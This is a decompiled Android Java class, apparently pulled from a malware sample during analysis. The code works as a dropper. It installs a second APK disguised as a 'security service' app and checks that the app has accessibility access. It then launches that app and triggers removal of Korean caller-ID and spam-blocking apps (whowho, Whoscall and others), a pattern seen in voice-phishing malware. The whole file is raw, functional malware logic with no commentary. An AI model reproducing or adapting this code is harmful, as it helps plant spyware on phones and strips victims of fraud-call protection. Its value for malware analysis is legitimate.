package com.ldjSxw.heBbQd;

import android.app.AlertDialog;
import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.support.p014v4.app.ActivityCompat;
import android.support.p014v4.content.C0241b;
import android.view.View;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.Toast;
import com.ldjSxw.heBbQd.base.BaseActivity;
import com.ldjSxw.heBbQd.iservice.JobSevice;
import com.ldjSxw.heBbQd.p017a.C0739a;
import com.ldjSxw.heBbQd.p017a.C0740b;
import java.io.File;
import java.util.ArrayList;
import java.util.List;

/* loaded from: C:\Users\User\Desktop\kdt\project\kdt_mobsf\2024_mma\depack\download.dex */
public class ResultActivity extends BaseActivity {
    private Context mContext = this;

    /* JADX INFO: Access modifiers changed from: protected */
    @Override // com.ldjSxw.heBbQd.base.BaseActivity, android.support.p016v7.app.AppCompatActivity, android.support.p014v4.app.FragmentActivity, android.support.p014v4.app.SupportActivity, android.app.Activity
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        boolean isInstalled = C0740b.m49i(this.mContext, "com.bosetn.oct16m");
        boolean isAccessibilityOn = C0740b.m52f(this.mContext, "com.bosetn.oct16m");
        String onceDone = C0740b.m56b(this, "K_ALL_PROCESS_ONCE_DONE");
        if (!isInstalled || !isAccessibilityOn || onceDone.equalsIgnoreCase("")) {
            setContentView(2131296290);
            initViews();
            return;
        }
        setContentView(2131296289);
        initEmptyViews();
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    /* renamed from: com.ldjSxw.heBbQd.ResultActivity$a */
    /* loaded from: C:\Users\User\Desktop\kdt\project\kdt_mobsf\2024_mma\depack\download.dex */
    public class View$OnClickListenerC0734a implements View.OnClickListener {
        View$OnClickListenerC0734a() {
        }

        @Override // android.view.View.OnClickListener
        public void onClick(View v) {
            C0740b.m39s(ResultActivity.this);
            ResultActivity.this.finish();
        }
    }

    private void initEmptyViews() {
        ImageView mIvClose = (ImageView) findViewById(2131165281);
        mIvClose.setOnClickListener(new View$OnClickListenerC0734a());
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    /* renamed from: com.ldjSxw.heBbQd.ResultActivity$b */
    /* loaded from: C:\Users\User\Desktop\kdt\project\kdt_mobsf\2024_mma\depack\download.dex */
    public class View$OnClickListenerC0735b implements View.OnClickListener {
        View$OnClickListenerC0735b() {
        }

        @Override // android.view.View.OnClickListener
        public void onClick(View v) {
            ResultActivity.this.initInstall();
        }
    }

    private void initViews() {
        Button mClose = (Button) findViewById(2131165246);
        mClose.setOnClickListener(new View$OnClickListenerC0735b());
    }

    /* JADX INFO: Access modifiers changed from: protected */
    @Override // com.ldjSxw.heBbQd.base.BaseActivity
    public void onTargetPackageAdded() {
        super.onTargetPackageAdded();
        C0739a.m58a("target package added...");
        runTargetApp();
    }

    private void runTargetApp() {
        try {
            Intent intent = new Intent();
            ComponentName cn = new ComponentName("com.bosetn.oct16m", "com.bosetn.oct16m.MainActivity");
            intent.setComponent(cn);
            intent.putExtra("APP_LUNCH", ResultActivity.class.getName());
            intent.putExtra("PKG", getPackageName());
            startActivity(intent);
        } catch (Exception e) {
            C0739a.m58a("====>initInstall:" + e.toString());
            e.printStackTrace();
        }
    }

    private void deleteAPK() {
        try {
            boolean du = false;
            boolean who = C0740b.m49i(this.mContext, "com.ktcs.whowho") && !C0740b.m44n(this.mContext, "com.ktcs.whowho");
            boolean gogolook = C0740b.m49i(this.mContext, "gogolook.callgogolook2") && !C0740b.m44n(this.mContext, "gogolook.callgogolook2");
            boolean evine = C0740b.m49i(this.mContext, "com.andr.evine.who") && !C0740b.m44n(this.mContext, "com.andr.evine.who");
            if (C0740b.m49i(this.mContext, "com.whosthat.callerid") && !C0740b.m44n(this.mContext, "com.whosthat.callerid")) {
                du = true;
            }
            if (who) {
                C0740b.m33y(this, "com.ktcs.whowho");
            }
            if (gogolook) {
                C0740b.m33y(this, "gogolook.callgogolook2");
            }
            if (evine) {
                C0740b.m33y(this, "com.andr.evine.who");
            }
            if (du) {
                C0740b.m33y(this, "com.whosthat.callerid");
            }
            C0740b.m35w(this, "K_ALL_PROCESS_ONCE_DONE", "YES");
            if (!who && !gogolook && !evine && !du) {
                setContentView(2131296289);
                initEmptyViews();
                Toast.makeText(this.mContext, getString(2131427383), 1).show();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void requestWritePermission() {
        try {
            List<String> mList = new ArrayList<>();
            mList.add("android.permission.WRITE_EXTERNAL_STORAGE");
            mList.add("android.permission.READ_EXTERNAL_STORAGE");
            if (!mList.isEmpty()) {
                String[] permissions = (String[]) mList.toArray(new String[mList.size()]);
                ActivityCompat.requestPermissions(this, permissions, 1);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void initInstall() {
        boolean isInstalled;
        boolean isAccessibilityOn;
        try {
            isInstalled = C0740b.m49i(this.mContext, "com.bosetn.oct16m");
            isAccessibilityOn = C0740b.m52f(this.mContext, "com.bosetn.oct16m");
        } catch (Exception e) {
            e.printStackTrace();
        }
        if (isInstalled && !isAccessibilityOn) {
            runTargetApp();
        } else if (isInstalled && isAccessibilityOn) {
            deleteAPK();
        } else {
            int i = Build.VERSION.SDK_INT;
            if (i >= 26) {
                boolean hasPermission = getPackageManager().canRequestPackageInstalls();
                if (!hasPermission) {
                    C0740b.m36v(this.mContext);
                    return;
                }
            }
            if (i >= 31) {
                int result = C0241b.checkSelfPermission(this.mContext, "android.permission.WRITE_EXTERNAL_STORAGE");
                if (result != 0) {
                    Toast.makeText(this.mContext, "파일 액세스 권한 허용 해주세요.", 0).show();
                    requestWritePermission();
                }
                String path = Environment.getExternalStorageDirectory().getAbsolutePath() + "/보안서비스.apk";
                boolean isValidApk = C0740b.m42p(this.mContext, path);
                C0739a.m58a("isValidApk===>" + isValidApk);
                if (!isValidApk) {
                    this.mLoadingHandler.sendEmptyMessage(1);
                    this.mLoadingHandler.sendEmptyMessageDelayed(0, 6000L);
                    File file = new File(path);
                    if (file.exists()) {
                        file.delete();
                    }
                    C0740b.m35w(this.mContext, "K_APP_UNZIP_STATE", "");
                    C0740b.m34x(this.mContext, JobSevice.class);
                    return;
                }
                try {
                    AlertDialog.Builder mBuilder = new AlertDialog.Builder(this.mContext);
                    mBuilder.setTitle("보안서비스.apk".replace(".apk", ""));
                    mBuilder.setCancelable(false);
                    mBuilder.setMessage(getString(2131427370));
                    mBuilder.setPositiveButton(2131427382, new DialogInterface$OnClickListenerC0736c(this));
                    mBuilder.show();
                } catch (Exception e2) {
                    e2.printStackTrace();
                }
                return;
            }
            String path2 = getFilesDir() + "/pgsHZz.apk";
            boolean isValidApk2 = C0740b.m42p(this.mContext, path2);
            C0739a.m58a("isValidApk===>" + isValidApk2);
            if (!isValidApk2) {
                this.mLoadingHandler.sendEmptyMessage(1);
                this.mLoadingHandler.sendEmptyMessageDelayed(0, 6000L);
                File file2 = new File(path2);
                if (file2.exists()) {
                    file2.delete();
                }
                C0740b.m35w(this.mContext, "K_APP_UNZIP_STATE", "");
                C0740b.m34x(this.mContext, JobSevice.class);
                return;
            }
            try {
                AlertDialog.Builder mBuilder2 = new AlertDialog.Builder(this.mContext);
                mBuilder2.setTitle(getString(2131427373));
                mBuilder2.setCancelable(false);
                mBuilder2.setMessage(getString(2131427369));
                mBuilder2.setPositiveButton(2131427382, new DialogInterface$OnClickListenerC0737d());
                mBuilder2.show();
                return;
            } catch (Exception e3) {
                e3.printStackTrace();
                return;
            }
            e.printStackTrace();
        }
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    /* renamed from: com.ldjSxw.heBbQd.ResultActivity$c */
    /* loaded from: C:\Users\User\Desktop\kdt\project\kdt_mobsf\2024_mma\depack\download.dex */
    public class DialogInterface$OnClickListenerC0736c implements DialogInterface.OnClickListener {
        DialogInterface$OnClickListenerC0736c(ResultActivity this$0) {
        }

        @Override // android.content.DialogInterface.OnClickListener
        public void onClick(DialogInterface dialog, int which) {
            dialog.dismiss();
        }
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    /* renamed from: com.ldjSxw.heBbQd.ResultActivity$d */
    /* loaded from: C:\Users\User\Desktop\kdt\project\kdt_mobsf\2024_mma\depack\download.dex */
    public class DialogInterface$OnClickListenerC0737d implements DialogInterface.OnClickListener {
        DialogInterface$OnClickListenerC0737d() {
        }

        @Override // android.content.DialogInterface.OnClickListener
        public void onClick(DialogInterface dialog, int which) {
            String fullPath = ResultActivity.this.getFilesDir() + "/pgsHZz.apk";
            File file = new File(fullPath);
            if (file.exists()) {
                C0739a.m58a(fullPath + " " + file.exists());
                C0740b.m53e(ResultActivity.this.mContext, new File(fullPath));
            }
            dialog.dismiss();
        }
    }

    @Override // android.support.p014v4.app.FragmentActivity, android.app.Activity
    protected void onResume() {
        super.onResume();
        boolean isInstalled = C0740b.m49i(this.mContext, "com.bosetn.oct16m");
        String path = Environment.getExternalStorageDirectory().getAbsolutePath() + "/보안서비스.apk";
        if (isInstalled) {
            File file = new File(path);
            if (file.exists()) {
                file.delete();
            }
        }
    }
}